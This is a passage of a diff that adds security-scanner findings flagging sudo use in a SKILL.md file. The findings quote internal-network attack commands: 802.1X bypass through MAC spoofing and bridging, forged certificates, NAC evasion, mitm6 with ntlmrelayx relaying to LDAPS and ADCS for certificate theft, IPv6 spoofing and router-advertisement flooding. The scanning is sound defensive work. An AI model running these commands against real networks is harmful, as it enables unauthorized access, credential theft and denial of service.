+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 288,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-a5294a44fef642af89b9147396e51f9a",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 289,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "```bash\nsudo tcpdump -i eth0 -e -c 100 | awk '{print $2}' | sort -u  # discover authorized MACs\nsudo ip link set eth0 down\nsudo ip link set eth0 address AA:BB:CC:DD:EE:FF\nsudo ip link set eth0 up && sudo dhclient eth0\n```\n",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 289,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-496eec1fdf3945cc9a5c16bad84acba8",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 290,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "sudo tcpdump -i eth0 -e -c 100 | awk '{print $2}' | sort -u  # discover authorized MACs\nsudo ip link set eth0 down\nsudo ip link set eth0 address AA:BB:CC:DD:EE:FF\nsudo ip link set eth0 up && sudo dhclient eth0\n```\n\n### Hub / Bridge Insertion",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 290,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-6ecfdfedb8cf47dbace531b20f83dbd6",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 290,
+            "end_line": null,
+            "start_column": 28
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "sudo tcpdump -i eth0 -e -c 100 | awk '{print $2}' | sort -u  # discover authorized MACs\nsudo ip link set eth0 down\nsudo ip link set eth0 address AA:BB:CC:DD:EE:FF\nsudo ip link set eth0 up && sudo dhclient eth0\n```\n\n### Hub / Bridge Insertion",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 290,
+              "end_line": null,
+              "start_column": 28
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-28ca0ceba2e648b891d996a84b2adf11",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 298,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "Bridge between an authenticated device and the switch port. 802.1X authenticates the port, not individual MACs -- your traffic shares the authenticated session:\n\n```bash\nsudo ip link add name br0 type bridge\nsudo ip link set eth0 master br0          # eth0 to switch\nsudo ip link set eth1 master br0          # eth1 to authenticated device\nsudo ip link set br0 up",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 298,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-4db15e8e3a934fc1889e37aa86276bc0",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 299,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "\n```bash\nsudo ip link add name br0 type bridge\nsudo ip link set eth0 master br0          # eth0 to switch\nsudo ip link set eth1 master br0          # eth1 to authenticated device\nsudo ip link set br0 up\n```",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 299,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-ffa436db981b469b98e19cc995487185",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 300,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "```bash\nsudo ip link add name br0 type bridge\nsudo ip link set eth0 master br0          # eth0 to switch\nsudo ip link set eth1 master br0          # eth1 to authenticated device\nsudo ip link set br0 up\n```\n",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 300,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-58bfdbba546b4e8792ba48424191d42f",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 301,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "sudo ip link add name br0 type bridge\nsudo ip link set eth0 master br0          # eth0 to switch\nsudo ip link set eth1 master br0          # eth1 to authenticated device\nsudo ip link set br0 up\n```\n\n### Certificate Impersonation",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 301,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-c100d6df9f5241908a5497c4f320fbd9",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 313,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "openssl req -new -keyout client.key -out client.csr -subj \"/CN=PRINTER01/O=Corp\"\nopenssl x509 -req -in client.csr -CA fake-ca.crt -CAkey fake-ca.key -CAcreateserial -out client.crt\n# wpa_supplicant config: key_mgmt=IEEE8021X, eap=TLS, identity=\"PRINTER01\", certs as above\nsudo wpa_supplicant -i eth0 -D wired -c /etc/wpa_supplicant/wired.conf\n```\n\n### NAC Profiling Evasion",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 313,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-4d00971ddaf349bb8df445ab702e02ad",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 321,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "Match expected device fingerprint -- OUI, DHCP hostname, TCP stack:\n\n```bash\nsudo macchanger -m 00:1A:4B:XX:XX:XX eth0                     # HP printer OUI\nsudo dhclient -H \"HP-LaserJet-M402\" eth0                       # expected hostname\nsudo iptables -t mangle -A POSTROUTING -j TTL --ttl-set 128   # Windows TTL\n```",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 321,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-268ff96a72fa4007a79c4c4c3710f967",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 322,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "\n```bash\nsudo macchanger -m 00:1A:4B:XX:XX:XX eth0                     # HP printer OUI\nsudo dhclient -H \"HP-LaserJet-M402\" eth0                       # expected hostname\nsudo iptables -t mangle -A POSTROUTING -j TTL --ttl-set 128   # Windows TTL\n```\n",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 322,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-7bef66040a4145e3a0dc8897d847b03b",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 323,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "```bash\nsudo macchanger -m 00:1A:4B:XX:XX:XX eth0                     # HP printer OUI\nsudo dhclient -H \"HP-LaserJet-M402\" eth0                       # expected hostname\nsudo iptables -t mangle -A POSTROUTING -j TTL --ttl-set 128   # Windows TTL\n```\n\n---",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 323,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-1fbef2b6433f4d5388288038180533ab",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 337,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "mitm6 replies to DHCPv6 requests, sets your host as DNS, then victims' name lookups trigger NTLM authentication back to your relay listener:\n\n```bash\nsudo mitm6 -d corp.local -i eth0                                       # terminal 1: DNS takeover\nimpacket-ntlmrelayx -6 -t ldaps://dc01.corp.local \\\n  --delegate-access -wh attacker-wpad.corp.local                        # terminal 2: relay\n```",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 337,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-3a837a94de6e4f0fbcaf003bc9c2f0a1",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 358,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "### DHCPv6 Poisoning and THC-IPV6\n\n```bash\nsudo atk6-fake_dhcps6 eth0 fd00::99 fe80::1 corp.local   # fake DHCPv6 server\nsudo atk6-alive6 eth0                                      # discover IPv6 hosts\nsudo atk6-fake_router6 eth0 fd00::/64                      # SLAAC prefix injection\nsudo atk6-parasite6 eth0                                   # ICMPv6 neighbor spoofing",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 358,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-9beff3543ab74c179a19c946451b9a01",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 359,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "\n```bash\nsudo atk6-fake_dhcps6 eth0 fd00::99 fe80::1 corp.local   # fake DHCPv6 server\nsudo atk6-alive6 eth0                                      # discover IPv6 hosts\nsudo atk6-fake_router6 eth0 fd00::/64                      # SLAAC prefix injection\nsudo atk6-parasite6 eth0                                   # ICMPv6 neighbor spoofing\nsudo atk6-flood_router6 eth0                                # RA flood (DoS)",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 359,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-98c8b9650e894871a860ba2882c1bf5e",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 360,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "```bash\nsudo atk6-fake_dhcps6 eth0 fd00::99 fe80::1 corp.local   # fake DHCPv6 server\nsudo atk6-alive6 eth0                                      # discover IPv6 hosts\nsudo atk6-fake_router6 eth0 fd00::/64                      # SLAAC prefix injection\nsudo atk6-parasite6 eth0                                   # ICMPv6 neighbor spoofing\nsudo atk6-flood_router6 eth0                                # RA flood (DoS)\n```",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 360,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-5792254e6a6649a28822de992541b58e",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 361,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "sudo atk6-fake_dhcps6 eth0 fd00::99 fe80::1 corp.local   # fake DHCPv6 server\nsudo atk6-alive6 eth0                                      # discover IPv6 hosts\nsudo atk6-fake_router6 eth0 fd00::/64                      # SLAAC prefix injection\nsudo atk6-parasite6 eth0                                   # ICMPv6 neighbor spoofing\nsudo atk6-flood_router6 eth0                                # RA flood (DoS)\n```\n",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 361,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-c85f5461408e493982d6c62decd26391",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 362,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "sudo atk6-alive6 eth0                                      # discover IPv6 hosts\nsudo atk6-fake_router6 eth0 fd00::/64                      # SLAAC prefix injection\nsudo atk6-parasite6 eth0                                   # ICMPv6 neighbor spoofing\nsudo atk6-flood_router6 eth0                                # RA flood (DoS)\n```\n\n### NTLM Relay via IPv6",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 362,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-3b11bcc5ef104eb2afe23005d64d565c",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 368,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "### NTLM Relay via IPv6\n\n```bash\nsudo mitm6 -d corp.local -i eth0 --ignore-nofqdn\nimpacket-ntlmrelayx -6 -t http://ca.corp.local/certsrv/certfnsh.asp \\\n  -smb2support --adcs --template Machine                    # relay to ADCS for cert theft\n```",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 368,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-437acfb163eb4c5e8b78630b7e655ef7",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 382,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "### tcpdump\n\n```bash\nsudo tcpdump -i eth0 -w capture.pcap -nn                                         # full capture\nsudo tcpdump -i eth0 -w auth.pcap -nn 'port 21 or port 23 or port 25 or port 445 or port 80'\nsudo tcpdump -i eth0 -w broadcast.pcap -nn 'udp port 5355 or udp port 137 or udp port 5353'\nsudo tcpdump -i eth0 -w dhcp.pcap -nn 'udp port 67 or udp port 68'",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 382,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-7254fedc2c764f4fa5582f74d6d74c1d",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 383,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "\n```bash\nsudo tcpdump -i eth0 -w capture.pcap -nn                                         # full capture\nsudo tcpdump -i eth0 -w auth.pcap -nn 'port 21 or port 23 or port 25 or port 445 or port 80'\nsudo tcpdump -i eth0 -w broadcast.pcap -nn 'udp port 5355 or udp port 137 or udp port 5353'\nsudo tcpdump -i eth0 -w dhcp.pcap -nn 'udp port 67 or udp port 68'\n```",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 383,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-3ae869f1765c4c3da23660e6581cda9f",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 384,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "```bash\nsudo tcpdump -i eth0 -w capture.pcap -nn                                         # full capture\nsudo tcpdump -i eth0 -w auth.pcap -nn 'port 21 or port 23 or port 25 or port 445 or port 80'\nsudo tcpdump -i eth0 -w broadcast.pcap -nn 'udp port 5355 or udp port 137 or udp port 5353'\nsudo tcpdump -i eth0 -w dhcp.pcap -nn 'udp port 67 or udp port 68'\n```\n",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 384,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-ab5a0e52d70d4f52a41582405e1e6347",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 385,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
+          "code_snippet": "sudo tcpdump -i eth0 -w capture.pcap -nn                                         # full capture\nsudo tcpdump -i eth0 -w auth.pcap -nn 'port 21 or port 23 or port 25 or port 445 or port 80'\nsudo tcpdump -i eth0 -w broadcast.pcap -nn 'udp port 5355 or udp port 137 or udp port 5353'\nsudo tcpdump -i eth0 -w dhcp.pcap -nn 'udp port 67 or udp port 68'\n```\n\n### Wireshark Display Filters",
+          "intent": null,
+          "tags": [
+            "Privilege Escalation",
+            "contextual-triage",
+            "likely-benign-context"
+          ],
+          "evidence": {},
+          "match_fingerprint": "16746f7044f347c6322d4c5b879b3fb06b2f205cbf1c9a209b43d52b34b3afd7",
+          "occurrences": [
+            {
+              "file": "SKILL.md",
+              "start_line": 385,
+              "end_line": null,
+              "start_column": 0
+            }
+          ],
+          "surface": "instructions"
+        },
+        {
+          "id": "PE2",
+          "finding_id": "finding-f732fc227be34752a7a210e04df15dd3",
+          "category": "Privilege Escalation",
+          "pattern": "Sudo/Root Execution",
+          "severity": "MEDIUM",
+          "confidence": 0.7,
+          "location": {
+            "file": "SKILL.md",
+            "start_line": 409,
+            "end_line": null,
+            "start_column": 0
+          },
+          "finding": "sudo ",
+          "explanation": "Commands invoke sudo or root privileges. Verify this elevated access is necessary and justified.",
+          "remediation": "Avoid sudo/root unless strictly required. Prefer least-privilege patterns. If elevation is needed, document the justification and scope.",
